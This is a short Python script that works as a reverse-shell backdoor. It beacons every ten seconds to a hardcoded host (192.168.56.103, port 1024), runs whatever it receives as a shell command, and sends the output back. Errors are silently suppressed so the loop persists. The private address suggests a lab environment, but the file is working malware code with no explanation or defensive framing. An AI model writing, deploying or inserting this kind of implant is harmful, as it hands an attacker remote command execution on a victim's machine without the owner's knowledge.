import socket
import subprocess
import time

startTime = time.time()
waitTime = 10.0

HOST = "192.168.56.103"
PORT = 1024

while True:
	try:
		s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
		s.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)

		s.connect((HOST, PORT))

		data = s.recv(1024)
		command = subprocess.Popen(data, shell=True, stdout=subprocess.PIPE,stderr=subprocess.PIPE,)
		stdoutValue, stderrValue = command.communicate()

		if stdoutValue:
			output = stdoutValue
		elif stderrValue:
			output = stderrValue
		elif not stdoutValue and not stderrValue:
			output = "successfull execution but no output\n"

		s.sendall(output)

		s.close()

	except:
		pass

	time.sleep(waitTime - ((time.time() - startTime) % waitTime))

